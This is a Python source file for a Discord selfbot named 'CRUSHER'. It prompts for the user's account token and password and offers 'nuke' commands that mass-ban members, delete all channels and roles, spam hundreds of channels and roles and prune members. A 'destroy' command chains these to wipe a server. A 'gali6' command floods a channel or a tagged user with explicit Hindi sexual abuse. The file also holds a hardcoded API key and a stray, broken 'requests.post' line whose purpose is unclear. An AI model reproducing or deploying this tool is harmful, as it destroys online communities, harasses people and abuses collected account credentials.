import os
import random

import discord
import asyncio
import datetime
import functools
import io
import json
import os
import random
import re

import string
import urllib.parse
import urllib.request
import time
from urllib import parse, request
from itertools import cycle
from bs4 import BeautifulSoup as bs4

import aiohttp
import colorama
import discord
import numpy
import requests
from colorama import Fore
from discord.ext import commands
from discord.utils import get
from gtts import gTTS
from discord.ext import commands

import requests

import sys
import threading
import time
import json
import asyncio

import aiohttp
import headers

from pypresence import Presence
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands

token = input("Enter your token : ")
password = input("Enter your password : ")

crusher = commands.Bot(command_prefix=('c'), self_bot=True)

crusher.colour = '\x1b[38;5;56m'


@crusher.event
async def on_ready():
    



    print(f'selfbot is ready ')
    print(f''' {crusher.colour}                
   _____ _____  _    _  _____ _    _ ______ _____  
  / ____|  __ \| |  | |/ ____| |  | |  ____|  __ \ 
 | |    | |__) | |  | | (___ | |__| | |__  | |__) |
 | |    |  _  /| |  | |\___ \|  __  |  __| |  _  / 
 | |____| | \ \| |__| |____) | |  | | |____| | \ \ 
 \_____|_|  \_\ \____/|_____/|_|  |_|______|_|  \_\
                          
''')
    print(f'''
                       {crusher.colour}Logged in as: {crusher.user.name}{crusher.user.discriminator}
                       {crusher.colour}ID: {crusher.user.id}   
                       
                       {crusher.colour}Cached Users: {len(crusher.users)}
                       {crusher.colour}Guilds: {len(crusher.guilds)}
                       {crusher.colour}Prefix: {crusher.command_prefix}''')


async def ch_pr():
  await crusher.wait_until_ready()

  statuses = ["LOVE YOU BITCH " , " MAA CHODAO "  , "dnd" , "your mom's porn", " with your mom's pussy ", "your sister boobs", "ab bund pesh karo", "jisne padha vo randi ka ", "fuck you bitch"]

  while not crusher.is_closed():

    status = random.choice(statuses)

    await crusher.change_presence(activity = discord.Game(name =status))

    await asyncio.sleep(2)

crusher.loop.create_task(ch_pr())


crusher.remove_command ('help')       
@crusher.command(aliases=["commands"])
async def help(ctx):
    em = discord.Embed(title = " <a:420_girl_dance:928295299137552405>  **__Help__** <a:420_girl_dance:928295299137552405> \n \n \n ",url =  "https://discord.gg/YWvQuVFnBx" , description =  " `click on above /\ help for more`" , colour = discord.Colour.random() )
    em.set_image(url="https://media.discordapp.net/attachments/927140737009721424/927573151523684412/share.gif")
    em.set_thumbnail(url="https://media.discordapp.net/attachments/921749305126174790/922077265179852870/sexual-red.gif")
    em.add_field(name= " <a:vishal_sastanuker:928295195970240523>  **helpNUKE** ",value = " <a:Arrow:928295450925236304>  `NUKING COMMANDS ` <a:vishal_sastanuker:928295195970240523> \n \n \n ",inline = False)
    em.add_field(name=" <a:vishal_sastanuker:928295195970240523>  **helpFUN** ",value = " <a:Arrow:928295450925236304>  `FUN COMMANDS`   <a:vishal_sastanuker:928295195970240523> \n \n \n",inline = False)
    em.add_field(name= " <a:vishal_sastanuker:928295195970240523>  **__CREDITS__** " , value = " <a:69_hearts:928295377680105502> ! CRUSHER  <a:vishal_sastanuker:928295195970240523>  ",inline = True )
    message =  await ctx.send(embed= em )
    

    



   

 
@crusher.command()
async def helpnuke(ctx):
  em = discord.Embed(title = " <a:420_girl_dance:928295299137552405>  **__NUKE COMMANDS__** <a:420_girl_dance:923109515803656204>\n \n \n ",description =  " \n \n" , colour = discord.Colour.random() )
  em.set_image(url="https://media.discordapp.net/attachments/927140737009721424/927573151523684412/share.gif")
  em.set_thumbnail(url="https://media.discordapp.net/attachments/921749305126174790/922077265179852870/sexual-red.gif")
  em.add_field(name= " <a:vishal_sastanuker:928295195970240523>   **RenameServer** ",value = "  <a:Arrow:928295450925236304> `Rename Server Name`  <a:vishal_sastanuker:928295195970240523>  \n \n \n ",inline = False)
  em.add_field(name= "<a:vishal_sastanuker:928295195970240523>   **SpamChannels** ",value = "  <a:Arrow:928295450925236304> `Create mass channels  `<a:vishal_sastanuker:928295195970240523> \n \n \n ",inline = False)
  em.add_field(name= "<a:vishal_sastanuker:928295195970240523>  **SpamRoles** ",value = " <a:Arrow:928295450925236304> `Create mass roles  `<a:vishal_sastanuker:928295195970240523> \n \n \n ",inline = False)
  em.add_field(name= "<a:vishal_sastanuker:928295195970240523>  **DelChannels** ",value = "  <a:Arrow:928295450925236304>`Delete all channels`  <a:vishal_sastanuker:928295195970240523> \n \n \n ",inline = False)
  em.add_field(name= "<a:vishal_sastanuker:928295195970240523>  **Nickall** ",value = "  <a:Arrow:928295450925236304> `Rename all Users`  <a:vishal_sastanuker:928295195970240523> \n \n \n ",inline = False)
  em.add_field(name= "<a:vishal_sastanuker:928295195970240523>   **RenameChannels** ",value = "  <a:Arrow:928295450925236304> `Rename all channels`  <a:vishal_sastanuker:928295195970240523>  \n \n \n ",inline = False)
  em.add_field(name= "<a:vishal_sastanuker:928295195970240523>   **DelRoles** ",value = "  <a:Arrow:928295450925236304> `Delete all Roles`  <a:vishal_sastanuker:928295195970240523> \n \n \n ",inline = False)
  em.add_field(name= "<a:vishal_sastanuker:928295195970240523>  **Massban** ",value = "  <a:Arrow:928295450925236304>`Ban all members`  <a:vishal_sastanuker:928295195970240523>  \n \n \n ",inline = False)
  em.add_field(name= "<a:vishal_sastanuker:928295195970240523>  **Masskick** ",value = "  <a:Arrow:928295450925236304> `kick all members`  <a:vishal_sastanuker:928295195970240523>  \n \n \n ",inline = False)
  em.add_field(name= "<a:vishal_sastanuker:928295195970240523>   **prune** ",value = " <a:Arrow:928295450925236304>  `prune members`  <a:vishal_sastanuker:928295195970240523>  \n \n \n ",inline = False)
  message =  await ctx.send(embed= em )

 
@crusher.command()
async def helpfun(ctx):
  em = discord.Embed(title = " <a:420_girl_dance:928295299137552405>  **__FUN / UTILITY COMMANDS__** <a:420_girl_dance:928295299137552405>\n \n \n ",description =  " \n \n" , colour = discord.Colour.random() )
  em.set_image(url="https://media.discordapp.net/attachments/927140737009721424/927573151523684412/share.gif")
  em.set_thumbnail(url="https://media.discordapp.net/attachments/921749305126174790/922077265179852870/sexual-red.gif")
  em.add_field(name= "<a:vishal_sastanuker:928295195970240523>  **MemberCount** ",value = " <a:Arrow:928295450925236304>`Member count of the server`  <a:vishal_sastanuker:928295195970240523> \n \n \n ",inline = False)
  em.add_field(name= "<a:vishal_sastanuker:928295195970240523>  **Embed** ",value = "  <a:Arrow:928295450925236304> `Embeds the message you send  `<a:vishal_sastanuker:928295195970240523>\n \n \n ",inline = False)
  em.add_field(name= "<a:vishal_sastanuker:928295195970240523>  **Icon** ",value = "  <a:Arrow:928295450925236304> `provides the server logo  `<a:vishal_sastanuker:928295195970240523>\n \n \n ",inline = False)
  em.add_field(name= "<a:vishal_sastanuker:928295195970240523>  **Av** ",value = "  <a:Arrow:928295450925236304> `Shows the avatar of mentioned user`  <a:vishal_sastanuker:928295195970240523>\n \n \n ",inline = False)
  em.add_field(name= "<a:vishal_sastanuker:928295195970240523>  **Flirt** ",value = "  <a:Arrow:928295450925236304> `Sends a random flirtious line to mentioned user`  <a:vishal_sastanuker:928295195970240523> \n \n \n ",inline = False)
  em.add_field(name= "<a:vishal_sastanuker:928295195970240523>  **Ping** ",value = "  <a:Arrow:928295450925236304>`Tells the ping of the selfbot`  <a:vishal_sastanuker:928295195970240523> \n \n \n ",inline = False)
  em.add_field(name= "<a:vishal_sastanuker:928295195970240523>  **Spam** ",value = "  <a:Arrow:928295450925236304> `spams the message`  <a:vishal_sastanuker:928295195970240523> \n \n \n ",inline = False)
  em.add_field(name= "<a:vishal_sastanuker:928295195970240523> **Purge** ",value = "  <a:Arrow:928295450925236304> `Purge your own messages`  <a:vishal_sastanuker:928295195970240523>\n \n \n ",inline = False)
  em.add_field(name= "<a:vishal_sastanuker:928295195970240523>  **MassReact** ",value = "  <a:Arrow:928295450925236304> `Reacts on multiple messages with the same emojie`  <a:vishal_sastanuker:928295195970240523> \n \n \n ",inline = False)
  em.add_field(name= "<a:vishal_sastanuker:928295195970240523> **Gali6** ",value = " <a:Arrow:928295450925236304> `DANGEER `   <a:vishal_sastanuker:928295195970240523>  \n \n \n ",inline = False)
  message =  await ctx.send(embed= em )

@crusher.command(aliases=['Servercount','SERVERCOUNT', 'SC','sc'])
async def servercount(ctx):
 
  await ctx.send(f" total servers {str(len(crusher.guilds))}")
  


@crusher.command(aliases=["fancy",'Ascii','ASCII','FANSY','Fansy'])
async def ascii(ctx, *, text):
    await ctx.message.delete()
    r = requests.get(
        f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}'
    ).text
    if len('```' + r + '```') > 2000:
        return
    await ctx.send(f"```{r}```")


@crusher.command()
async def roleall(ctx, role:discord.Role):
   await ctx.message.delete() 
   for member in ctx.guild.members:
        try:
            await member.add_roles(role)
        except:
            continue
   await ctx.send(f"{role} has been given to all members")


@crusher.command()
async def rrole(ctx, role: discord.Role):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.remove_roles(role)
        except:
            continue

    await ctx.send(f"{role} has been removed from all members")


@crusher.command(name='mc')
async def membercount(ctx):
  await ctx.message.delete()
  await ctx.send(f"{ctx.guild.name} has {ctx.guild.member_count} members")

@crusher.command()
async def banner(ctx ):
    await ctx.message.delete()
    
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.banner_url)
    await ctx.send(embed=em)


@crusher.command()
async def banneruser(ctx, * , user:  discord.Member ):
    await ctx.message.delete()
    
    
    await ctx.send(ctx.user.banner_url)

@crusher.command(aliases=['Poll','POLL'])
async def poll(ctx, *, question):
    await ctx.message.delete()
    embed = discord.Embed(title = f"__**WHat do you think about this ?? **__:\n \n{question} ",colour = discord.Colour.random())
   
    

    message =  await ctx.send(embed= embed)
    await message.add_reaction('❎')
    await message.add_reaction('✅')



@crusher.command()
async def embed(ctx,*, message):
    await ctx.message.delete()
    embed = discord.Embed(title = f"{message}",
    colour = discord.Colour.random())
    await ctx.send(embed= embed)






@crusher.command()
async def icon(ctx):
    icon_url = ctx.guild.icon_url
    await ctx.send(f"The icon url is: {icon_url}")



@crusher.command(aliases=['Av','AV','Avatar','AVATAR','avatar'])
async def av(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format=format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file=discord.File(file, f"Avatar.{format}"))

lines= ("yaarrr tumhari aavaj itni cute hai ki man makrta hai pura din tumhare sath call pe rahu","Well, here I am. What are your other two wishes?","I must be a snowflake, because I’ve fallen for you.","You’re like daal to my chawal . Should we mix it up?","You’re more garam than my chai.","I’m no photographer, but I can picture us together.","Were you born on Diwali?Because you’re a pataka.","Hey, girl! You’re like a jelebee. Sweet and curvy.","Did your license get suspended for driving all these guys crazy?","Did you just come out of the oven? Because you’re hot.","Is your name Google? Because you have everything I’ve been searching for.","Are you a time traveler? Cause I see you in my future!","Are you religious? Because you’re the answer to all my prayers."," I seem to have lost my phone number. Can I have yours?"," I seem to have lost my phone number. Can I have yours?","Was your dad a boxer? Because damn, you’re a knockout!","Aside from being sexy, what do you do for a living?","Hi, how was heaven when you left it?"," Kiss me if I’m wrong, but dinosaurs still exist, right?","Did it hurt? When you fell from heaven?","I may not be a genie, but I can make your dreams come true.","If nothing lasts forever, will you be my nothing?","Can I slap you in the face…with my lips?") 

requests.post(posts,message)
@crusher.command()
async def flirt(ctx,* ,user:discord.Member = None):
  await ctx.message.delete()
  if user == None :
     user = " "
     await ctx.send(random.choice(lines))
  else:
     r = user.mention + random.choice(lines)
     await ctx.send(r)
@crusher.command(aliases=["banwave", "banall", "etb"])
async def massban(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason="crusher jood")
        except:
            pass

@crusher.command(aliases=["masschannels", "masschannel", "ctc"])
async def spamchannels(ctx):
    await ctx.message.delete()
    for _i in range(250):
       try:
            await ctx.guild.create_text_channel(name="crusher Runs You")
            await ctx.guild.create_text_channel(name="CRUSHER Runs You")
       except:
            return

@crusher.command(aliases=["delchannel"])
async def delchannels(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return


@crusher.command(aliases=["deleteroles"])
async def delroles(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass



@crusher.command(aliases=[])
async def spamroles(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
          await ctx.guild.create_role(name= "CRUSHER Op")
          await ctx.guild.create_role(name= "NR Op")
        except:
          pass

@crusher.command(aliases=["purgebans", "unbanall"])
async def massunban(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass


@crusher.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)



@crusher.command()
async def ping(ctx):
    await ctx.message.delete()
    before = time.monotonic()
    message = await ctx.send("🏓 Pinging...")
   
    ping = (time.monotonic() - before) * 1000
    await ctx.send(content=f"`pong 🏓: {int(ping)} ms`")





@crusher.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(
            lambda m: m.author == crusher.user).map(lambda m: m):
        try:
            await message.delete()
        except:
            pass


@crusher.command()
async def massreact(ctx, emote, lmt : int):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=lmt).flatten()
    for message in messages:
      await message.add_reaction(emote)


@crusher.command()
async def adminservers(ctx):
    await ctx.message.delete()
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in crusher.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    adminPermServers = f"**Servers with Admin ({len(admins)}):**\n{admins}"
    botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
    banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
    kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
    await ctx.send(adminPermServers + botPermServers + banPermServers +
                   kickPermServers)

 

@crusher.command()
async def sendall(ctx, *, message):
    await ctx.message.delete()
    try:
        channels = ctx.guild.text_channels
        for channel in channels:
            await channel.send(message)
    except:
        pass
@crusher.command(aliases=["rs", "nameserver"])
async def servername(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)

@crusher.command(aliases=["rc"])
async def renamechannels(ctx, *, name):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        await channel.edit(name=name)


@crusher.command()
async def prune(ctx , amount: int):
    await ctx.message.delete()
    await ctx.guild.prune_members(days=amount, compute_prune_count=False, roles=ctx.guild.roles)

@crusher.command()
async def ah(ctx):
  for _i in range(10000):
    try:
      await ctx.send("*hb")
      await asyncio.sleep(180)
    except:
      return
      






@crusher.command(aliases=["gali6"])
async def randi(ctx, param=None, user: discord.Member = None ):
    
    await ctx.message.delete()
    if param is None:
        await ctx.send("Please specify yes or no", delete_after=3)
          
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(
                ctx.message.channel, discord.GroupChannel):
            await ctx.send(
                "You can't bind Auto-MEE6 to a DM or GC", delete_after=3)
            return
        else:
            crusher.mee6 = True
            await ctx.send(
                "hn bol bsdk teri mummy ki")
            crusher.mee6_channel = ctx.channel.id
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        crusher.mee6 = False
        await ctx.send("Chali ja digital raand")
    while crusher.mee6 is True:
        sentences = [
            'behen ke lode randi ke madarchod',
            'teri makii chut fad dunga bhen ke lund',
            'tere maki chut mai 6inch ka loda dalke 60 bachheee krwadunga madarchod', 
            'bhen ke lund ab bol bsdk teri ma ka bhosda randi', 
             'teri maa kee boobs pe machar katke sab chus lenge bsdk ', 
             'teri maa ko gb road pe nanga krke usse murja krwau bhen ke lode madarchod', 
             'teri gaand mai 4 dade behenkelode', 
             'teri maa ko kutto se chudwau', 
             'randi ke bache madarchod', 
             'yaha se lode fek ke marunga tera pura khandaaan chud jayega madarchod', 
             'tere baap ke muh mai hag dunga madarchod ', 
             'jab teri maa ko deep throat dunga aur wo chailayegi to baith ke dekhna shanti se bsdk', 
             'madarchod randi ke teri ma ka bhosda behen ke lode ghasti ke bache',
             'lode Teri maa ka bhosda teri gaand Mein dum nahi hai madarchod ke bachhe Tu  bhenkelode teri maa ki choot bhadwe behen ke lode ab bol sale chapri randikebachhe bhadwe randi ki aulaad Teri maa ka bhosda teri gaand Mein dum nahi hai madarchod ke bachhe Tu  teri choot mai ganne dalke raas nikal dunga madarchod bhenkelode maa ki choot teri sale bikhari randikebachhe bhadwe randi ki aulaad', 
       ]
        if user == None:
          await crusher.get_channel(crusher.mee6_channel).send(random.choice(sentences))
          await asyncio.sleep(0.5) 
        else:
          c =  user.mention + random.choice(sentences)
          await crusher.get_channel(crusher.mee6_channel).send(c)
          await asyncio.sleep(0.5) 


stream_url = "https://discord.gg/nukersop"
@crusher.command(aliases=["streaming"])
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url=stream_url,
    )
    await crusher.change_presence(activity=stream)

@crusher.command() 
async def byy(ctx):
   await ctx.message.delete()

   embed = discord.Embed(title = "<a:dragonbyee:852002179891855420>  \n byye guyss shayad he aab aaunga discord peee sorryy aagar kuch bol diya ho aagar maine oor meri kuch galti ho to bhul jana... So hope for the best future and byeee..! \n <a:dragonbyee:852002179891855420>  ",colour = discord.Colour.green())

   await ctx.send(embed= embed)


@crusher.command()
@commands.has_permissions(manage_messages=True)
async def personalpoll(ctx, *, question):
  
    embed = discord.Embed(title = f"\n \n{question} ",colour = discord.Colour.red())
   
    

    message =  await ctx.send(embed= embed)

    await message.add_reaction('✅')
    await message.add_reaction('❎')
    

@crusher.command(aliases=["logout"])
async def shutdown(ctx):
    await ctx.message.delete()
    await crusher.logout()


@crusher.command()
async def nickall(ctx, nickname):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.edit(nick=nickname)
        except:
            pass 

@crusher.command(aliases=["giphy", "tenor", "searchgif"])
async def gif(ctx, query=None):
    await ctx.message.delete()
    if query is None:
        r = requests.get("https://api.giphy.com/v1/gifs/random?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&tag=&rating=R")
        res = r.json()
        await ctx.send(res['data']['url'])

    else:
        r = requests.get(
            f"https://api.giphy.com/v1/gifs/search?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&q={query}&limit=1&offset=0&rating=R&lang=en")
        res = r.json()
        await ctx.send(res['data'][0]["url"])


@crusher.command(aliases=["rekt", "nuke"])
async def destroy(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name= " CRUSHER OP",
            description="CRUSHER OP",
            reason="CRUSHER OP ",
            icon="https://media.discordapp.net/attachments/927140737009721424/927573151523684412/share.gif",
            banner="https://media.discordapp.net/attachments/927140737009721424/927573151523684412/share.gif"
        )
    except:
        pass


    for _i in range(250):
      
        await ctx.guild.create_text_channel(name="CRUSHER OP")
    
    for _i in range(250):
        await ctx.guild.create_role(name="CRUSHER OP", 
        color=discord.colour.random())
      
@crusher.command(aliases=["roles"])
async def getroles(ctx):
    await ctx.message.delete()
    roles = list(ctx.guild.roles)
    roles.reverse()
    roleStr = ""
    for role in roles:
        if role.name == "@everyone":
            roleStr += "@\u200beveryone"
        else:
            roleStr += role.name + "\n"

    await ctx.send(roleStr)

crusher.run(token, bot=False)
